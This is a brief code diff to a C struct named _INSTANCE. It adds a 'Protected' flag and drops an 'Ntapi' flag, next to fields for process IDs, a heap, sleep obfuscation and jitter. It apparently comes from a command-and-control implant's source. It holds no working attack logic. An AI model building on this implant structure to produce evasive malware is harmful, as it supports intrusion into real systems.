@@ -196,11 +196,11 @@ typedef struct _INSTANCE {
         PWSTR  ProcessName;
         PWSTR  ProcessFullPath;
         PWSTR  ProcessCmdLine;
+        BOOL   Protected;
         DWORD  ParentProcId;
         DWORD  ProcessId;
         DWORD  ThreadId;
         PVOID  Heap;
-        BOOL   Ntapi;
         DWORD  SleepObf;
         DWORD  SleepTime;
         DWORD  Jitter;
